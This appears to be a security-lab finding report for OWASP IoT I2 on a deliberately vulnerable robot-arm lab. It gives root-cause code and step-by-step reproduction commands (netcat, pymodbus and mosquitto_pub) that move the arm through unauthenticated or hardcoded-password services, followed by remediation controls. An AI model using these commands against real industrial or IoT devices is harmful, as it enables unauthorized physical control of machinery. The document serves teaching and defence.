---
id: IoT:I2
title: "Insecure Network Services"
category: IoT
status: IN PROGRESS
severity: Critical
owasp: "IoT I2 - Insecure Network Services"
cwe: "CWE-306 (Missing Authentication for Critical Function) / CWE-319 (Cleartext Transmission)"
source_docs:
  - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §5, §7 (IoT:I2)"
  - "stages/01_spec/output/octobot-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/octobot/files/opt/octobot/serial_bus.py"
  - "labs/octobot/files/opt/octobot/robot_modbus_server.py"
  - "labs/octobot/files/opt/octobot/robot_mqtt_bridge.py"
verified_date: ""
---

## Why It Matters

The robot arm is reachable over three network services on the flat lab LAN: a raw serial-over-TCP bus (`:2000`), Modbus/TCP (`:502`), and MQTT (`:1883`). All three are reachable without credentials, but the difficulty of moving the arm varies. The raw bus now requires the hardcoded `PASS:` prefix, Modbus/TCP requires the password XOR-encrypted into holding registers, and MQTT auto-injects the password for any publisher. The net result is still unauthenticated physical control for anyone who discovers the easiest path (MQTT) or extracts the leaked Modbus hint, which is the canonical ICS exposure: network reachability becomes actuator control. Reconnaissance is trivial: nmap's `mqtt-subscribe` script succeeds anonymously and leaks the broker version plus full `$SYS` telemetry, while `8883/tcp` is closed, confirming no TLS path exists.

## Root Cause

The serial bus binds all interfaces and accepts any TCP connection, and MQTT still moves the arm with no credentials:

```python
# labs/octobot/files/opt/octobot/serial_bus.py
srv.bind(('0.0.0.0', BUS_PORT))                # [IoT:I9] binds all interfaces
...
for line in conn.makefile('r'):                # [IoT:I2] reachable without auth; movement needs PASS:
    forward(line, client)
```

```python
# labs/octobot/files/opt/octobot/robot_mqtt_bridge.py
HARD_CODED_PASSWORD = 'OctoSuperBot2026'

def bus_send(cmd):
    cmd = cmd.strip()
    if is_movement(cmd):
        cmd = f'PASS:{HARD_CODED_PASSWORD} {cmd}'
    ...forward...
```

Modbus/TCP has no session authentication by protocol design, and the server attempts to compensate with a hardcoded XOR-encrypted password. Because the encryption key is fixed and the server leaks the password as a hint on failure, the protection is cosmetic:

```python
# labs/octobot/files/opt/octobot/robot_modbus_server.py
HARD_CODED_PASSWORD = 'OctoSuperBot2026'
AUTH_KEY = 0x55

def check_auth():
    chars = [regs[PWD_OFFSET + i] & 0xFF for i in range(PWD_LEN)]
    if decrypt_password(chars) == HARD_CODED_PASSWORD:
        regs[PWD_STATUS] = 1
        return True
    regs[PWD_STATUS] = 2
    for i, c in enumerate(HARD_CODED_PASSWORD):
        regs[PWD_HINT + i] = ord(c)
    return False
```

Firmware analysis confirms that the insecurity is baked into the base image: `binwalk` extraction of `/dev/mmcblk0p2` shows `Package: mosquitto-nossl` in `usr/lib/opkg/status`, and `/etc/mosquitto/mosquitto.conf` ships with all authentication options commented out and `use_uci 0`, so anonymous connections are allowed by default. See [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).

## Steps to Reproduce

```bash
# Service discovery
nmap -sV -p 2000,502,1883 192.168.2.1

# Detailed MQTT reconnaissance also discloses the broker version and $SYS statistics
nmap -sC -sV -p 1883,8883 192.168.2.1
# 1883/tcp open  mosquitto version 2.0.18
# | mqtt-subscribe: anonymous $SYS topic readback succeeds, leaking:
# |   $SYS/broker/version: mosquitto version 2.0.18
# |   $SYS/broker/clients/connected: 2
# |   $SYS/broker/subscriptions/count: 1
# |_  ... full broker telemetry readable without credentials
# 8883/tcp closed secure-mqtt

# A. Raw serial bus - movement without PASS: is dropped and leaks the hint
printf 'S3:5\n' | nc 192.168.2.1 2000
# -> ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>
# arm does not move

# B. Raw serial bus - movement with PASS: works
printf 'PASS:OctoSuperBot2026 S3:5\n' | nc 192.168.2.1 2000
# claw closes

# C. Modbus/TCP - write base servo angle without auth registers
python3 -c 'from pymodbus.client import ModbusTcpClient as C; c=C("192.168.2.1",port=502); c.connect(); c.write_register(0,10); rr=c.read_holding_registers(37,count=16); print("hint:", "".join(chr(r) for r in rr.registers)); c.close()'
# -> hint: OctoSuperBot2026
# (If a previous authenticated write left the password in registers 40021-40036,
# clear them first with c.write_registers(20, [0]*16) to see the failure.)

# D. Modbus/TCP - write encrypted password then command
python3 -c '
from pymodbus.client import ModbusTcpClient as C
pwd = "OctoSuperBot2026"
enc = [ord(c) ^ 0x55 for c in pwd]
c = C("192.168.2.1", port=502)
c.connect()
c.write_registers(20, enc)   # 40021-40036
r = c.write_register(0, 10)  # 40001
print("error" if r.isError() else "ok")
c.close()
'
# -> ok; base servo moves

# E. MQTT - publish a command, no username/password; bridge auto-injects PASS:
mosquitto_pub -h 192.168.2.1 -t cell01/cmd -m 'S0:0'
# -> arm moves

# F. Firmware forensics - confirm mosquitto-nossl and anonymous defaults in the base image
ssh root@192.168.2.1 'dd if=/dev/mmcblk0p2 bs=4M count=32 2>/dev/null' > p2_sample.img
binwalk -e -M p2_sample.img
grep -E "^Package: mosquitto-nossl" _p2_sample.img.extracted/squashfs-root/usr/lib/opkg/status
# -> Package: mosquitto-nossl
grep -E "allow_anonymous|use_uci" _p2_sample.img.extracted/squashfs-root/etc/mosquitto/mosquitto.conf
# -> # allow_anonymous true  (commented, default is anonymous allowed)
# -> #use_uci 0
```

## Expected Result

`nmap` fingerprints all three open ports. The raw serial bus drops movement commands without `PASS:`, returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`, and executes commands with it. Modbus/TCP rejects command writes that lack the encrypted password and writes the cleartext password to the hint registers. MQTT moves the arm with no credentials because the bridge auto-injects the password.

## How It Should Be

Put the OT services behind authentication and transport security: client certificates or a token on the bus and MQTT, Modbus wrapped in TLS (stunnel) or replaced with an authenticated channel, and bind to the management interface only rather than `0.0.0.0`. Never use a fixed XOR key or leak the password in diagnostic registers.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Network | Bind to LAN-mgmt interface, firewall to a jump host | Remove blanket reachability |
| Transport | TLS on the bus, MQTT over TLS, Modbus via stunnel | End cleartext control |
| Auth | Token / client cert on every northbound service | No anonymous actuation |
| Crypto | Use a real key-agreement or HMAC, not a fixed XOR | Prevent trivial decryption and hint leaks |

## Verification Checklist

- [ ] `nmap -sV` shows `:2000`, `:502`, `:1883` open
- [ ] `nmap -sC -sV -p 1883,8883` fingerprints `mosquitto version 2.0.18` and reads `$SYS/broker/*` telemetry without credentials
- [ ] `nmap -sC -sV -p 1883,8883` shows `8883/tcp closed secure-mqtt`
- [ ] `printf 'S0:90\n' | nc :2000` does **not** move the arm and returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`
- [ ] `printf 'PASS:OctoSuperBot2026 S0:90\n' | nc :2000` moves the arm
- [ ] Modbus register write without prior encrypted password returns an exception and writes `OctoSuperBot2026` to hint registers 40038-40053
- [ ] Modbus register write with encrypted password in 40021-40036 moves the arm
- [ ] `mosquitto_pub` to `cell01/cmd` moves the arm with no credentials
- [ ] Binwalk extraction of `mmcblk0p2` shows `Package: mosquitto-nossl` in `usr/lib/opkg/status`
- [ ] Extracted `/etc/mosquitto/mosquitto.conf` leaves `allow_anonymous` implicitly true
